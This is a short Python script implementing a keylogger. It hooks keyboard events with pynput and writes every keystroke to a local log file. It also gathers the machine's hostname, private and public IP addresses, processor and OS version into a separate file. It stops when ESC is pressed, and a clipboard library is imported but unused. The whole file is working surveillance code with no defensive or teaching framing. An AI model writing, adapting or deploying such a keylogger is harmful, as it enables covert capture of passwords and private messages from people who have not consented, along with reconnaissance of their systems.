import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import os
from requests import get

# File paths and constants
keys_information = "key_log.txt"
system_information = "info.txt"
file_path = "D:\\python\\codes"
extend = "\\"

# Global variables
count = 0
keys = []
system_info_logged = False

def log_system_info():
    """Logs system information only once."""
    try:
        with open(file_path + extend + system_information, "w") as f:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            
            # Get public IP address
            try:
                public_ip = get("https://api.ipify.org").text
                f.write(f"Public IP Address is: {public_ip}\n")
            except Exception:
                f.write("Couldn't get Publi IP\n")
            
            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP: {ip_address}\n")
    except Exception as e:
        print(f"Error logging system information: {e}")

def press(key):
    """Handles key press events and writes to the log."""
    global keys, count
    keys.append(key)
    count += 1
    
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    """Writes captured keys to the file."""
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

def left(key):
    """Exits keylogger when ESC is pressed."""
    if key == Key.esc:
        print("User pressed Escape. Exiting...")
        return False

# Main execution logic
if not os.path.exists(file_path + extend + system_information):
    log_system_info()

with Listener(on_press=press, on_release=left) as listener:
    listener.join()
